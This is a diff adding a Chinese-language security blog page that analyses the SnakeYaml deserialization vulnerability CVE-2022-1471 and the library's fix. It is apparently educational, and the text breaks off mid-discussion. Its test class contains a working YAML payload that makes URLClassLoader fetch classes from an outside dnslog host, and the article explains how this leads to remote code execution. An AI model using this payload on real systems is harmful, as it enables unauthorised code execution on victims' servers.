@@ -1,0 +1,1202 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+  <meta http-equiv="Pragma" content="no-cache">
+  <meta http-equiv="Expires" content="0">
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/dayu/dayu-apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/dayu/dayu-web-app-manifest-512x512.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/dayu/dayu-web-app-manifest-192x192.png">
+  <link rel="mask-icon" href="/images/dayu/dayu-favicon.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"dayutech.github.io","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"gitalk","storage":true,"lazyload":false,"nav":null,"activeClass":"gitalk"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":5,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="SnakeYaml反序列化过程与漏洞原理分析（CVE-2022-1471） 文字描述难免有所补足，请移步视频讲解：SnakeYaml反序列化过程与漏洞原理分析（CVE-2022-1471）  产品介绍SnakeYaml是一个完整的YAML1.1规范Processor，支持UTF-8&#x2F;UTF-16，支持Java对象的序列化&#x2F;反序列化，支持所有YAML定义的类型。 漏洞概述该漏洞源">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SnakeYaml反序列化过程与漏洞原理分析（CVE-2022-1471）">
+<meta property="og:url" content="https://dayutech.github.io/archives/f98d45ce.html">
+<meta property="og:site_name" content="Dayu Technology Co., LTD">
+<meta property="og:description" content="SnakeYaml反序列化过程与漏洞原理分析（CVE-2022-1471） 文字描述难免有所补足，请移步视频讲解：SnakeYaml反序列化过程与漏洞原理分析（CVE-2022-1471）  产品介绍SnakeYaml是一个完整的YAML1.1规范Processor，支持UTF-8&#x2F;UTF-16，支持Java对象的序列化&#x2F;反序列化，支持所有YAML定义的类型。 漏洞概述该漏洞源">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://dayutech.github.io/archives/f98d45ce/image-20230814161735123.png">
+<meta property="og:image" content="https://dayutech.github.io/archives/f98d45ce/image-20230814161845728.png">
+<meta property="og:image" content="https://dayutech.github.io/archives/f98d45ce/image-20230814162654884.png">
+<meta property="og:image" content="https://dayutech.github.io/archives/f98d45ce/image-20230814162937919.png">
+<meta property="og:image" content="https://dayutech.github.io/archives/f98d45ce/image-20230814163122111.png">
+<meta property="og:image" content="https://dayutech.github.io/archives/f98d45ce/image-20230814164251442.png">
+<meta property="og:image" content="https://dayutech.github.io/archives/f98d45ce/image-20230814164458986.png">
+<meta property="og:image" content="https://dayutech.github.io/archives/f98d45ce/image-20230814164703271.png">
+<meta property="og:image" content="https://dayutech.github.io/archives/f98d45ce/image-20230814164959202.png">
+<meta property="og:image" content="https://dayutech.github.io/archives/f98d45ce/image-20230814165131638.png">
+<meta property="og:image" content="https://dayutech.github.io/archives/f98d45ce/image-20230814165258362.png">
+<meta property="og:image" content="https://dayutech.github.io/archives/f98d45ce/image-20230814170038625.png">
+<meta property="og:image" content="https://dayutech.github.io/archives/f98d45ce/image-20230814170426979.png">
+<meta property="og:image" content="https://dayutech.github.io/archives/f98d45ce/image-20230814170947063.png">
+<meta property="og:image" content="https://dayutech.github.io/archives/f98d45ce/image-20230814172249327.png">
+<meta property="og:image" content="https://dayutech.github.io/archives/f98d45ce/image-20230814172306770.png">
+<meta property="og:image" content="https://dayutech.github.io/archives/f98d45ce/image-20230814173636570.png">
+<meta property="og:image" content="https://dayutech.github.io/archives/f98d45ce/image-20230814174418936.png">
+<meta property="og:image" content="https://dayutech.github.io/archives/f98d45ce/image-20230814174500741.png">
+<meta property="og:image" content="https://dayutech.github.io/archives/f98d45ce/image-20230814174437825.png">
+<meta property="og:image" content="https://dayutech.github.io/archives/f98d45ce/image-20230814193403071.png">
+<meta property="og:image" content="https://dayutech.github.io/archives/f98d45ce/image-20230814193503552.png">
+<meta property="og:image" content="https://dayutech.github.io/archives/f98d45ce/image-20230814194127911.png">
+<meta property="og:image" content="https://dayutech.github.io/archives/f98d45ce/image-20230814194330452.png">
+<meta property="og:image" content="https://dayutech.github.io/archives/f98d45ce/image-20230814194609615.png">
+<meta property="og:image" content="https://dayutech.github.io/archives/f98d45ce/image-20230814194851114.png">
+<meta property="og:image" content="https://dayutech.github.io/archives/f98d45ce/image-20230814195046711.png">
+<meta property="article:published_time" content="2025-04-10T09:56:11.000Z">
+<meta property="article:modified_time" content="2025-07-29T09:02:07.253Z">
+<meta property="article:author" content="Arliya">
+<meta property="article:tag" content="RCE">
+<meta property="article:tag" content="反序列化">
+<meta property="article:tag" content="网络安全">
+<meta property="article:tag" content="漏洞分析">
+<meta property="article:tag" content="漏洞">
+<meta property="article:tag" content="SnakeYaml">
+<meta property="article:tag" content="CVE-2022-1471">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://dayutech.github.io/archives/f98d45ce/image-20230814161735123.png">
+
+<link rel="canonical" href="https://dayutech.github.io/archives/f98d45ce.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/theme-next/theme-next-needmoreshare2@1/needsharebutton.min.css"><style>
+#needsharebutton-postbottom {
+  cursor: pointer;
+  height: 26px;
+  margin-top: 10px;
+  position: relative;
+}
+#needsharebutton-postbottom .btn {
+  border: 1px solid $btn-default-border-color;
+  border-radius: 3px;
+  display: initial;
+  padding: 1px 4px;
+}
+</style><style>
+#needsharebutton-float {
+  bottom: 88px;
+  cursor: pointer;
+  left: -8px;
+  position: fixed;
+  z-index: 9999;
+}
+#needsharebutton-float .btn {
+  border: 1px solid $btn-default-border-color;
+  border-radius: 4px;
+  padding: 0 10px 0 14px;
+}
+</style>
+  <title>SnakeYaml反序列化过程与漏洞原理分析（CVE-2022-1471） | Dayu Technology Co., LTD</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="Dayu Technology Co., LTD" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Dayu Technology Co., LTD</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">大禹科技股份有限公司</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-rss">
+
+    <a href="/atom.xml" rel="section"><i class="fa fa-rss fa-fw"></i>RSS</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <a href="https://github.com/dayutech/dayutech.github.io" class="github-corner" title="Dayu GitHub" aria-label="Dayu GitHub" rel="noopener external nofollow noreferrer" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://dayutech.github.io/archives/f98d45ce.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/dayu/avatar.png">
+      <meta itemprop="name" content="Arliya">
+      <meta itemprop="description" content="主要从事Web漏洞挖掘工作，涉猎编程语言包括Java、Scala、C/C++、PHP、Python、C#、Golang，涉及领域包括Web以及二进制漏洞挖掘，二进制比较菜，平时喜欢在金融市场消费">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Dayu Technology Co., LTD">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          SnakeYaml反序列化过程与漏洞原理分析（CVE-2022-1471）
+        </h1>
+
+        <div class="post-meta">
+		  
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2025-04-10 17:56:11" itemprop="dateCreated datePublished" datetime="2025-04-10T17:56:11+08:00">2025-04-10</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-07-29 17:02:07" itemprop="dateModified" datetime="2025-07-29T17:02:07+08:00">2025-07-29</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" itemprop="url" rel="index"><span itemprop="name">漏洞分析</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/" itemprop="url" rel="index"><span itemprop="name">安全技术</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>2.8k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>10 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="SnakeYaml反序列化过程与漏洞原理分析（CVE-2022-1471）"><a href="#SnakeYaml反序列化过程与漏洞原理分析（CVE-2022-1471）" class="headerlink" title="SnakeYaml反序列化过程与漏洞原理分析（CVE-2022-1471）"></a>SnakeYaml反序列化过程与漏洞原理分析（CVE-2022-1471）</h1><blockquote>
+<p>文字描述难免有所补足，请移步视频讲解：<a target="_blank" rel="noopener external nofollow noreferrer" href="https://www.bilibili.com/video/BV1X14y1v71x/">SnakeYaml反序列化过程与漏洞原理分析（CVE-2022-1471）</a></p>
+</blockquote>
+<h2 id="产品介绍"><a href="#产品介绍" class="headerlink" title="产品介绍"></a>产品介绍</h2><p>SnakeYaml是一个完整的YAML1.1规范Processor，支持UTF-8&#x2F;UTF-16，支持Java对象的序列化&#x2F;<a target="_blank" rel="noopener external nofollow noreferrer" href="https://so.csdn.net/so/search?q=%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&spm=1001.2101.3001.7020">反序列化</a>，支持所有YAML定义的类型。</p>
+<h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>该漏洞源于程序在进行反序列化过程中未对用户输入内容做合法性验证，导致了恶意代码执行。</p>
+<span id="more"></span>
+
+<h2 id="受影响版本"><a href="#受影响版本" class="headerlink" title="受影响版本"></a>受影响版本</h2><p>&lt;&#x3D; SnakeYaml 1.33</p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="调试环境"><a href="#调试环境" class="headerlink" title="调试环境"></a>调试环境</h3><p>使用idea新建基于maven的java项目，在pom.xml中引入snakeyaml包</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.yaml<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>snakeyaml<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.27<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>编写测试类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.yaml.snakeyaml.constructor.Constructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">context</span> <span class="operator">=</span> <span class="string">&quot;!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\&quot;http://i0hrz1.dnslog.cn\&quot;]]]]&quot;</span>;</span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();</span><br><span class="line">        yaml.load(context);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在dnslog平台获取一个域名填到payload中，然后运行程序观察dnslog平台得域名解析情况，若有解析记录，则证明存在漏洞。</p>
+<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>本文我们不从漏洞手，而是首先了解以下snakeyaml时怎样进行反序列化的，观察在反序列化过程中都有哪些重要的步骤，反序列化过程中又是为何能够解析到我们提供的域名，进而能够进行远程类加载，执行恶意代码。首先我们需要打初始的断点：</p>
+<p><img src="/archives/f98d45ce/image-20230814161735123.png" alt="image-20230814161735123"></p>
+<p>虽然漏洞的触发入口时在load方法，但是我们首先需要关注的时yaml对象的初始化过程。</p>
+<p><img src="/archives/f98d45ce/image-20230814161845728.png" alt="image-20230814161845728"></p>
+<p>从上图，yaml队形初始化过程中共计涉及到5个对象的构建</p>
+<table>
+<thead>
+<tr>
+<th>对象</th>
+<th>功用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Contructor</td>
+<td>对象构造器，负责JavaBean对象的构造</td>
+</tr>
+<tr>
+<td>Representer</td>
+<td>表示器，不知道有啥用，因为没有具体到它的方法，它在本漏洞中扮演的角色不是特别重要</td>
+</tr>
+<tr>
+<td>DumperOptions</td>
+<td>JavaBean对象序列化选项</td>
+</tr>
+<tr>
+<td>LoaderOptions</td>
+<td>yaml序列化数据反序列化配置选项，在漏洞修复版本中就是在该类中增加了新的反序列化选项来限制自定义的全局TAG</td>
+</tr>
+<tr>
+<td>Resolver</td>
+<td>分析器，具体作用定位不太好描述，另外还有个parser，和resolver解释很像，没太区分明白，当然仔细研究的话肯定还是可以区分。</td>
+</tr>
+</tbody></table>
+<p>load方法会调用loadFromReader从streamReader中加载对象，而streamReader其实又封装了stringReader对象，面向对象这层层封装还是挺恶心的。</p>
+<p><img src="/archives/f98d45ce/image-20230814162654884.png" alt="image-20230814162654884"></p>
+<p>可以看到就是封装了一些元数据，包括数据窗口的大小，数据长度，数据流，流是否结束标志，缓冲区等，而在StringReader中也仅封装了字符串长度与字符串字面量而已。</p>
+<p><img src="/archives/f98d45ce/image-20230814162937919.png" alt="image-20230814162937919"></p>
+<p>loadFromReader方法主要完成composer（构建器）的创建以及数据的构建。</p>
+<p><img src="/archives/f98d45ce/image-20230814163122111.png" alt="image-20230814163122111"></p>
+<p>构建器里主要封装了解析器、分析器、反序列化配置、锚点、递归节点等数据。</p>
+<p>解析器里封装了扫描器，扫描器负责对序列化字符串进行逐个字符扫描以获取token、元素入口与出口、获取键与值、块入口与出口等。</p>
+<p>分析器主要负责通过数据内容来推测对应的数据类型，Yaml语法中主要包含三种数据类型即序列、映射与标量，所谓序列就是列表、数组类似的概念，映射可以理解为Python中的字典、Java中的Map，标量时Yaml中的最小的不可再分的基本数据类型，包括字符串、整数、浮点数、日期时间等类型。</p>
+<p>通过contrutor的getSingleData方法可以获得到一个type指定类型的对象。其首先需要调用composer的getSingleNode方法获取到一个Node对象，该Node对象时对我们传入的序列化数据的格式化解析与封装。然后电泳constructDocument方法通过Node对象获取最终的目标对象。</p>
+<p><img src="/archives/f98d45ce/image-20230814164251442.png" alt="image-20230814164251442"></p>
+<p>我们首先关注getSingleNode方法。进入该方法会首先通过解析器对事件进行配置</p>
+<p><img src="/archives/f98d45ce/image-20230814164458986.png" alt="image-20230814164458986"></p>
+<p>可以看到获取事件时其实时同故宫state对象进行创建的，而state对象其实是一个Production接口的实例。</p>
+<p><img src="/archives/f98d45ce/image-20230814164703271.png" alt="image-20230814164703271"></p>
+<p>其有很多的实现类，分别对应不同的节点类型的不同处理阶段。</p>
+<p><img src="/archives/f98d45ce/image-20230814164959202.png" alt="image-20230814164959202"></p>
+<p>我们在初始化解析器的时候会初始化state对下个为ParseStreamStart的实例</p>
+<p><img src="/archives/f98d45ce/image-20230814165131638.png" alt="image-20230814165131638"></p>
+<p>故此处调用的produce方法即是<code>org.yaml.snakeyaml.parser.ParserImpl.ParseStreamStart#produce</code>，在该方法中获取了获取了流解析开始事件并重置了state为下一阶段的隐式文档解析开始状态。每一个事件中都包含两个重要的标志Mark，一个称之为startMark一个称之为endMark，分别标识了当前事件处理的开始与结束位置</p>
+<p><img src="/archives/f98d45ce/image-20230814165258362.png" alt="image-20230814165258362"></p>
+<p>在获取到事件后，判断事件是否为流结束事件，若不是则进入到节点解析逻辑。在此逻辑开始时会调用getEvent方法获取一个开始事件，待composeNode方法调用完毕后，再嗲用getEvent方法获取到一个结束事件，最后对锚点与记录的递归节点进行清理。</p>
+<p><img src="/archives/f98d45ce/image-20230814170038625.png" alt="image-20230814170038625"></p>
+<p>在composeNode方法中主要有两个分支，如果你的序列化数据设置了锚点与别名此时会进入第一个分支，若没有则会进入到else分支，我们这里会进入到else分支。</p>
+<p><img src="/archives/f98d45ce/image-20230814170426979.png" alt="image-20230814170426979"></p>
+<p>在else分支中还是首先会把事件往前推一次，获得的NodeEvent主要包含三种类型分别为ScalarNode SequenceNode MappingNode，即我们开始谈到的Yaml格式的三种类型标量、序列以及映射，很明显我们这里会进入到序列的处理逻辑里面。</p>
+<p>在composeSequenceNode方法中首先设置事件为SequenceStartEvent，即序列处理开始，然后会尝试获取Tag，关于tag的内容可以在<a target="_blank" rel="noopener external nofollow noreferrer" href="https://yaml.org/spec/1.2.2/#tag-shorthands%E4%BA%86%E8%A7%A3%EF%BC%8C%E7%84%B6%E5%90%8E%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AASequenceNode%E5%AF%B9%E8%B1%A1%EF%BC%8C%E5%9C%A8%E6%9E%84%E9%80%A0SequenceNode%E5%AF%B9%E8%B1%A1%E6%97%B6%E4%BC%9A%E5%B0%86children%E5%BD%93%E4%BD%9C%E5%8F%82%E6%95%B0%E4%BC%A0%E8%BF%9B%E5%8E%BB%E8%B5%8B%E5%80%BC%E7%BB%99%E5%B1%9E%E6%80%A7this.value%EF%BC%8C%E6%88%91%E4%BB%AC%E7%9F%A5%E9%81%93ArrayList%E6%98%AF%E5%BC%95%E7%94%A8%E7%B1%BB%E5%9E%8B%EF%BC%8C%E8%8B%A5%E4%BB%A5%E5%A4%96%E7%A7%92%E5%AF%B9children%E7%9A%84%E4%BF%AE%E6%94%B9%E5%B0%86%E5%BD%B1%E5%93%8D%E5%88%B0SequenceNode%E4%B8%AD%E7%9A%84%E5%80%BC%E3%80%82%E7%84%B6%E5%90%8E%E5%97%B2%E7%94%A8composeNode%E6%96%B9%E6%B3%95%E7%BB%A7%E7%BB%AD%E8%BF%9B%E8%A1%8C%E8%8A%82%E7%82%B9%E5%90%8E%E8%A7%81%E5%B9%B6%E6%B7%BB%E5%8A%A0%E5%88%B0children%E4%B8%AD%E4%BD%9C%E4%B8%BASequenceNode%E7%9A%84%E5%AD%90%E8%8A%82%E7%82%B9%E3%80%82%E5%88%B0%E8%BF%99%E9%87%8C%E5%B0%B1%E5%B7%B2%E7%BB%8F%E5%BC%80%E5%A7%8B%E9%80%92%E5%BD%92%E8%A7%A3%E6%9E%90%E4%BA%86%EF%BC%8C%E7%9B%B4%E5%88%B0%E8%A7%A3%E6%9E%90%E5%88%B0StreamEnd%E3%80%82">https://yaml.org/spec/1.2.2/#tag-shorthands了解，然后创建一个SequenceNode对象，在构造SequenceNode对象时会将children当作参数传进去赋值给属性this.value，我们知道ArrayList是引用类型，若以外秒对children的修改将影响到SequenceNode中的值。然后嗲用composeNode方法继续进行节点后见并添加到children中作为SequenceNode的子节点。到这里就已经开始递归解析了，直到解析到StreamEnd。</a></p>
+<p><img src="/archives/f98d45ce/image-20230814170947063.png" alt="image-20230814170947063"></p>
+<p>在获取到Node后，就进入到目标对象构建的流程中</p>
+<p><img src="/archives/f98d45ce/image-20230814172249327.png" alt="image-20230814172249327"></p>
+<p>在constructObject方法中还对获取到的node对象进行了缓存检查</p>
+<p><img src="/archives/f98d45ce/image-20230814172306770.png" alt="image-20230814172306770"></p>
+<p>在调用getConstructor时会首先从预设好的13中内置构造器中尝试选择，若没有匹配的则返回一个ConstructYamlObject的构造器，然后调用器ConstructYamlObject的getConstructor方法通过反射的方式获得目标类的Class实例，然后根据Node类型获取到不同的几点构造器，此处为ContructSequence</p>
+<p>然后调用器construct方法，该方法也时通过节点tag的不同类型选择不同的处理逻辑，这里会进入到可变对象的对象构建逻辑中。由下图，在这个逻辑中会首先获取当前Node的value属性，也就是子节点的尺寸然后与获得的目标类的构造方法的参数尺寸进行比较，若成功匹配则依次对直接点调用constructObjec递归构建对象然后作为父节点的构造方法参数传参同通过反射的方式进行实例化。</p>
+<p><img src="/archives/f98d45ce/image-20230814173636570.png" alt="image-20230814173636570"></p>
+<p>在我们提供的payload中，也就是最终我们要构建的类是javax.script.ScriptEngineManager，构造该类调用的是其含有一个参数的有参构造方法，其参数为一个类加载器java.net.URLClassLoader，而在构造java.net.URLClassLoader时也是调用其含有一个参数的有参构造方法不过其参数时一个数组，所以我们会考到java.net.URLClassLoader后嵌套了两层[[，其数组类型为java.net.URL。我们知道URLClassLoader会从传入的URL进行远程的类加载工作，那么这个payload极有可能涉及到远程恶意类加载与实例化。那么ScriptEngineManager的构造方法又做了什么呢</p>
+<p><img src="/archives/f98d45ce/image-20230814174418936.png" alt="image-20230814174418936"></p>
+<p><img src="/archives/f98d45ce/image-20230814174500741.png" alt="image-20230814174500741"></p>
+<p><img src="/archives/f98d45ce/image-20230814174437825.png" alt="image-20230814174437825"></p>
+<p>可以看到这是一个很明显的SPI调用过程，我们只需要在远程部署一个实现了ScriptEngineFactory接口的类，并子啊其静态代码块中写入命令执行的代码，并在其Classpath:META-INFO&#x2F;services&#x2F;javax.script.ScriptEngineFactory文件中应用该实现类即可完成利用。具体的远程RCE可以上网自行寻找。</p>
+<p>在最新版的snake中该漏洞得到了修复，官方通过在loadConfigs对象中引入了新的配置项并且限制了反序列化递归调用嵌套深度的方式来对反序列化漏洞进行了限制。</p>
+<p>限制递归深度在org.yaml.snakeyaml.composer.Composer#increaseNestingDepth方法中检查，最大深度默认为50层</p>
+<p><img src="/archives/f98d45ce/image-20230814193403071.png" alt="image-20230814193403071"></p>
+<p>目标类类型检查在下图处检查，首先节点Tag是否是自定义的全局tag如果是则调用org.yaml.snakeyaml.inspector.TagInspector#isGlobalTagAllowed方法进行检查，TagInspector是一个接口，其默认实现是org.yaml.snakeyaml.inspector.UnTrustedTagInspector。isGlobalTagAllowed方法默认返回false，即不允许使用全局的Tag。</p>
+<p><img src="/archives/f98d45ce/image-20230814193503552.png" alt="image-20230814193503552"></p>
+<p>我们在编写代码的时候如果需要指定发序列化的目标类类型则必须要实现TagInspector接口，重写isGlobalTagAllowed方法，然后将其注入到LoaderOptions实例化对象中。</p>
+<p>默认不允许使用全局tag</p>
+<p><img src="/archives/f98d45ce/image-20230814194127911.png" alt="image-20230814194127911"></p>
